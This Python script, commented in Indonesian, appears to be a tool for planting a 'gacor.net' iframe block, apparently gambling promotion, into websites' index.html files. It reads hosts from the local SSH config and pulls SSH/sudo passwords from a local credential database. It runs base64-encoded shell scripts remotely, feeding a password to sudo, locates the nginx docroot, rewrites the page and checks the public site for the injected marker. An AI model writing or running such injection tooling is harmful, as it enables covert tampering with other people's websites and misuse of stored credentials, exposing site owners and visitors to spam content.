#!/usr/bin/env python3
"""Tanam blok gacor.net ke docroot situs lewat ssh. Mode: --cek (baca saja) / --tanam."""
import base64
import sqlite3
import subprocess
import sys
import urllib.request
from pathlib import Path

AKAR = Path(__file__).resolve().parent.parent
DB = AKAR / "data" / "hestia.db"
OPSI = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=accept-new", "-o", "ConnectTimeout=8"]

SISIP = """
<section id="hestia-gacor" style="max-width:1100px;margin:24px auto;padding:0 16px">
  <h2 style="font:600 20px system-ui;margin:0 0 12px">BOSGACOR &mdash; gacor.net</h2>
  <iframe src="https://gacor.net/" title="gacor.net" loading="lazy"
    style="width:100%;height:900px;border:1px solid #e5e7eb;border-radius:12px;background:#fff"></iframe>
</section>
"""


def shq(s):
    return "'" + str(s).replace("'", "'\\''") + "'"


def blok_ssh():
    c = Path.home() / ".ssh" / "config"
    if not c.exists():
        return []
    hasil, kini = [], None
    for baris in c.read_text(errors="ignore").splitlines():
        b = baris.strip()
        if b.lower().startswith("host ") and not b.lower().startswith("hostname"):
            if kini:
                hasil.append(kini)
            kini = {"alias": b.split(None, 1)[1].strip(), "hostname": "", "port": "22", "key": "", "user": ""}
        elif kini is not None and b and not b.startswith("#"):
            k, _, v = b.partition(" ")
            k, v = k.strip().lower(), v.strip()
            if k == "hostname":
                kini["hostname"] = v
            elif k == "port":
                kini["port"] = v
            elif k == "identityfile":
                kini["key"] = v
            elif k == "user":
                kini["user"] = v
    if kini:
        hasil.append(kini)
    return hasil


def kredensial(domain):
    akar = domain.split(".")[0]
    try:
        con = sqlite3.connect(str(DB))
        r = con.execute("SELECT nama,secret FROM kredensial "
                        "WHERE (target LIKE ? OR target LIKE ?) "
                        "AND (lower(tipe) LIKE '%ssh%' OR lower(tipe) LIKE '%sudo%' OR lower(tipe) LIKE '%vps%') "
                        "ORDER BY id DESC LIMIT 1",
                        ("%" + akar + "%", "%" + domain + "%")).fetchone()
        con.close()
        if r:
            return r[0] or "", r[1] or ""
    except Exception:
        pass
    return "", ""


def ssh_jalan(b, skrip, sandi=None, timeout=90, user=None):
    b64 = base64.b64encode(skrip.encode()).decode()
    if sandi:
        luar = "echo %s | sudo -S -p '' bash -c \"echo %s | base64 -d | bash\"" % (shq(sandi), b64)
    else:
        luar = "echo %s | base64 -d | bash" % b64
    key = Path(b["key"].replace("~", str(Path.home())))
    user = user or b["user"] or ("wesearch" if "wesearch" in b["alias"] else b["alias"])
    return subprocess.run(["ssh", "-i", str(key), "-p", b["port"]] + OPSI +
                          ["%s@%s" % (user, b["hostname"]), luar],
                          capture_output=True, text=True, timeout=timeout)


def skrip_cek(domain):
    akar = domain.split(".")[0]
    return """
DOM="{DOM}"
echo "host=$(hostname) user=$(id -un)"
echo "--- vhost ---"
grep -rh -m2 -B6 "server_name[^;]*$DOM" /etc/nginx/conf.d /etc/nginx/sites-enabled /etc/nginx/nginx.conf 2>/dev/null | head -20
echo "--- docroot ---"
DOK=$(grep -Rh -A8 "server_name[^;]*$DOM" /etc/nginx 2>/dev/null | grep -m1 -oE "root[[:space:]]+[^;]+" | awk '{print $2}')
echo "docroot=$DOK"
[ -n "$DOK" ] || { echo "docroot tidak ketemu"; exit 0; }
[ -n "$DOK" ] || { echo "docroot tidak ketemu"; exit 1; }
F="$DOK/index.html"
[ -f "$F" ] || F=$(find "$DOK" -maxdepth 2 -name 'index.html' 2>/dev/null | head -1)
echo "berkas=$F"
ls -la "$F" 2>/dev/null
echo "ukuran=$(wc -c < "$F" 2>/dev/null)"
echo "marker=$(grep -c hestia-gacor "$F" 2>/dev/null)"
echo "--- isi (300 byte) ---"
head -c 300 "$F" 2>/dev/null
echo
echo "--- cek dari dalam lewat nginx ---"
curl -sS -H "Host: $DOM" http://127.0.0.1/ 2>/dev/null | grep -c hestia-gacor
""".replace("{DOM}", domain).replace("{AKAR}", akar)


def main():
    mode = "--tanam" if "--tanam" in sys.argv else "--cek"
    arg = [a for a in sys.argv[1:] if not a.startswith("--")]
    if not arg:
        print("pakai: tanam_ssh.py <domain> [--tanam]")
        return 2
    domain = arg[0]
    nama, sandi = kredensial(domain)
    print("kredensial ssh di DB:", ("ada user=%s" % nama) if nama else "tidak ada")
    for b in blok_ssh():
        if not b["hostname"]:
            continue
        key = Path(b["key"].replace("~", str(Path.home())))
        if not key.exists():
            continue
        try:
            r = ssh_jalan(b, skrip_cek(domain))
        except Exception as e:
            print("ssh %s gagal: %r" % (b["alias"], e))
            continue
        keluar = (r.stdout or "") + (r.stderr or "")
        if "docroot=" not in keluar or "docroot=\n" in keluar:
            print("--- %s: docroot tidak ketemu, dilewati" % b["alias"])
            for l in keluar.splitlines():
                print("      " + l)
            continue
        print("### pakai alias=%s" % b["alias"])
        for l in keluar.splitlines():
            print("   " + l)
        if mode == "--cek":
            return 0
        print("--- mode tanam ---")
        print("   sandi dari DB:", "ADA" if sandi else "TIDAK ADA")
        skrip = """
set -e
DOM="{DOM}"
DOK=$(grep -Rh -A8 "server_name[^;]*$DOM" /etc/nginx 2>/dev/null | grep -m1 -oE "root[[:space:]]+[^;]+" | awk '{print $2}')
[ -n "$DOK" ] || { echo "docroot tidak ketemu"; exit 1; }
F="$DOK/index.html"
[ -f "$F" ] || { echo "index.html tidak ada"; exit 0; }
echo "berkas=$F ukuran=$(wc -c < "$F")"
grep -q hestia-gacor "$F" && { echo "= sudah tertanam"; exit 0; }
cp -n "$F" "$F.bak" 2>/dev/null || true
echo "cadangan=$F.bak ada=$([ -f "$F.bak" ] && echo ya || echo tidak)"
python3 - "$F" <<'PYEOF'
import sys
p = sys.argv[1]
h = open(p, encoding="utf-8", errors="ignore").read()
s = open("/tmp/hestia-sisip.html", encoding="utf-8").read()
open(p, "w", encoding="utf-8").write(h.replace("</body>", s + "</body>", 1) if "</body>" in h else h + s)
print("+ ditambal")
PYEOF
echo "ukuran_baru=$(wc -c < "$F")"
echo "marker_baru=$(grep -c hestia-gacor "$F")"
echo "--- cek dari dalam ---"
curl -sS -H "Host: $DOM" http://127.0.0.1/ 2>/dev/null | grep -c hestia-gacor
""".replace("{DOM}", domain)
        b64s = base64.b64encode(SISIP.encode()).decode()
        siap = ("echo %s | base64 -d > /tmp/hestia-sisip.html; " % b64s) + skrip
        r2 = ssh_jalan(b, siap, sandi=sandi if sandi else None, timeout=120)
        for l in ((r2.stdout or "") + (r2.stderr or "")).splitlines():
            print("   " + l)
        print("--- verifikasi publik ---")
        for i in range(1, 6):
            try:
                req = urllib.request.Request("https://%s/" % domain, headers={"Cache-Control": "no-cache"})
                with urllib.request.urlopen(req, timeout=20) as x:
                    isi = x.read().decode("utf-8", "ignore")
                n = isi.count("hestia-gacor")
                print("   putaran %d: hestia-gacor=%d" % (i, n))
                if n:
                    break
            except Exception as e:
                print("   putaran %d: %r" % (i, e))
            import time
            time.sleep(10)
        return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
